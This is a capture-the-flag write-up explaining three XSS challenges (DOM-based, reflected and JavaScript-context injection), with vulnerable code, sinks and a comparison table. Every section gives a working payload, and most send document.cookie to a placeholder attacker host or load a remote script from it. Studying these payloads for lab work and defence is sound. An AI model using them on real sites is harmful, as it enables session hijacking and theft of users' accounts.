## 🧨 Challenge: `xss-5` — **DOM-Based XSS (Client-Side JavaScript Vulnerability)**

### 🔍 Vulnerable Code Snippet:

```javascript
document.getElementById("output").innerHTML = location.hash;
```

### 🔎 What’s happening?

* `location.hash` gets the URL fragment (the part after `#` in the browser URL bar).
  Example:
  If URL = `http://localhost/#hello`, then `location.hash` is `#hello`.

* `innerHTML` means "insert this value as **HTML**", not just text.

### 🚨 Why is it vulnerable?

* Whatever you put after `#` is **directly inserted as HTML** into the page!
* No filtering or sanitization → **you can insert actual HTML/JavaScript tags**

### 🧪 Payload:

```html
#<img src=1 onerror=fetch('http://YOUR-IP:PORT/?cookie='+document.cookie)>
```

#### ✅ Syntax Explanation:

* `#` → starts the URL fragment (your input)
* `<img src=1>` → invalid image URL to trigger an error
* `onerror=...` → JavaScript runs when the image fails to load
* `fetch(...)` → sends a GET request to your server with the cookies

### 📌 Injection Vector:

* You control the `location.hash` (URL fragment) in the browser.

### ⚠️ Sink:

* `element.innerHTML` → this is **where** the vulnerable code is using your input in a dangerous way.

---

## 🧨 Challenge: `xss-6` — **Reflected XSS (Server-Side HTML Injection)**

### 🔍 Vulnerable Code Snippet:

```javascript
res.send(`<h1>Hello ${name}</h1>`);
```

### 🔎 What’s happening?

* A server-side template uses `name` from the URL query parameter (`?name=...`)
* It directly includes it in the HTML page, **without escaping** any characters.

### 🚨 Why is it vulnerable?

* If you put HTML tags into `name`, it will be inserted into the page!
* Browser will interpret it as real HTML or JavaScript

### 🧪 Payload:

```html
<script src="http://YOUR-IP:PORT/"></script>
```

#### ✅ Syntax Explanation:

* `<script src=...>` → tells browser to load and execute JavaScript from your server
* This bypasses filters that block inline scripts like `<script>alert(1)</script>`

You insert this payload into:

```url
http://challenge.localhost:3000/?name=<script src="http://YOUR-IP:PORT/"></script>
```

### 📌 Injection Vector:

* The `name` parameter in the URL query string.

### ⚠️ Sink:

* `res.send(...)` → this is the function that **writes the HTML to the response**, so if it includes unescaped user input, it becomes dangerous.

---

## 🧨 Challenge: `xss-7` — **JavaScript Context Injection (Script Injection)**

### 🔍 Vulnerable Code Snippet (HTML Template):

```html
<script>
    let auth = "${cookie}";
</script>
```

### 🔎 What’s happening?

* The server sets the value of a JS variable `auth` based on a cookie value
* The cookie value is inserted **inside JavaScript code**, between quotes

### 🚨 Why is it vulnerable?

* If you **break out of the quotes**, you can insert real JavaScript into the page
* No escaping means your input becomes **code**

### 🧪 Payload:

```javascript
";location='http://YOUR-IP:PORT/?cookie='+document.cookie;//
```

#### ✅ Syntax Explanation:

* `"` → closes the original string
* `;` → ends the JavaScript statement
* `location='...'` → sets the browser URL to your server, sending the cookie
* `' + document.cookie` → appends the actual cookie
* `//` → comments out the rest of the code so it doesn't break

So the final injected code becomes:

```html
<script>
    let auth = "";location='http://YOUR-IP:PORT/?cookie='+document.cookie;//";
</script>
```

Which is valid JavaScript and runs!

### 📌 Injection Vector:

* Cookie named `auth`, which the attacker sets or sends via a crafted link.

### ⚠️ Sink:

* Inside the `<script>` tag in the HTML page — your input becomes part of a JavaScript variable.

---

# 🧾 Final Comparison Writeup (`XSS_Comparison.md`)

````markdown
# 🛡️ XSS Challenge Comparison: xss-5 vs xss-6 vs xss-7

This document compares three Cross-Site Scripting (XSS) vulnerabilities from web challenges, focusing on **vulnerable code**, **injection vector**, **payload syntax**, and **execution context (sink)**.

---

## ✅ Challenge: xss-5 - DOM-Based XSS

- **Injection Vector:** `location.hash` (the part after `#` in the URL)
- **Vulnerable Code:**
  ```js
  document.getElementById("output").innerHTML = location.hash;
````

* **Sink:** `innerHTML` in browser JavaScript (DOM)
* **Payload:**

  ```html
  #<img src=1 onerror=fetch('http://YOUR-IP:PORT/?cookie='+document.cookie)>
  ```
* **Explanation:**

  * Attacker injects an HTML tag with a JavaScript handler.
  * `fetch()` sends cookies to attacker's server.
  * Exploits the browser's rendering of unescaped HTML.

---

## ✅ Challenge: xss-6 - Server-Side Reflected XSS

* **Injection Vector:** URL query parameter `?name=...`
* **Vulnerable Code:**

  ```js
  res.send(`<h1>Hello ${name}</h1>`);
  ```
* **Sink:** Server-rendered HTML response
* **Payload:**

  ```html
  <script src="http://YOUR-IP:PORT/"></script>
  ```
* **Explanation:**

  * Injected as part of the server's HTML.
  * The `<script>` tag loads attacker’s JS file.
  * Bypasses inline script filtering by referencing external file.

---

## ✅ Challenge: xss-7 - JavaScript Context Injection

* **Injection Vector:** Malicious cookie value (`auth=...`)
* **Vulnerable Code:**

  ```html
  <script>
      let auth = "${cookie}";
  </script>
  ```
* **Sink:** JavaScript variable inside `<script>` tag
* **Payload:**

  ```js
  ";location='http://YOUR-IP:PORT/?cookie='+document.cookie;//
  ```
* **Explanation:**

  * Breaks out of JS string and inserts new JS code.
  * Redirects browser to send cookies to attacker.
  * Ends line with `//` to comment out remaining code.

---

## 🧠 Key Differences Summary

| Challenge | Injection Vector | Execution Context (Sink) | Type of XSS      | Payload Style                |
| --------- | ---------------- | ------------------------ | ---------------- | ---------------------------- |
| xss-5     | URL hash (`#`)   | DOM (`innerHTML`)        | DOM-based        | HTML element with JS         |
| xss-6     | Query param      | Server-rendered HTML     | Reflected        | External script tag          |
| xss-7     | Cookie header    | Inside JS string         | Script injection | Break JS string, insert code |

---

## 🛡️ Final Thoughts

Understanding the **execution context** is critical when crafting payloads:

* HTML context: use tags like `<script>`, `<img onerror=...>`
* JavaScript context: escape strings and inject code
* DOM context: understand how JavaScript is manipulating the DOM

Always test payloads based on how your input is used — it's not just about finding where the input is, but **how it's interpreted**.
